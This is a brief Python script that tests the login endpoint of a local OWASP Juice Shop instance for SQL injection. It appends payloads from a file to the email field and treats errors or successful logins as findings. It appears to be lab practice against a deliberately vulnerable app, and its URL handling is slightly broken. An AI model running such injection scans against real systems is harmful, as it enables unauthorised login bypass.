import requests
def read_file_lines(file_path):
    payloads = []
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            payloads.append(line)
    return payloads

file_path = "test.txt"#file path
payloads = read_file_lines(file_path)
def check_sql_injection(url, username, password):
    for payload in payloads:
        data = {
            'email': username + payload,
            'password': password
        }
        response = requests.post(url + "/rest/user/login", json=data)
        if "error" in response.text.lower() or "sql syntax" in response.text.lower():
            print("[-] SQL Injection vulnerability found: " + url)
            print(payload)
        elif response.status_code == 200 and "Invalid email or password." not in response.text:
            print("[-] SQL Injection vulnerability found: " + url)
            return
    
    print("[+] No SQL Injection vulnerability found: " + url)

if __name__ == "__main__":
    juice_shop_url = "http://localhost:3000/#/"#website
    username = "test@example.com"
    password = "password"
    check_sql_injection(juice_shop_url, username, password)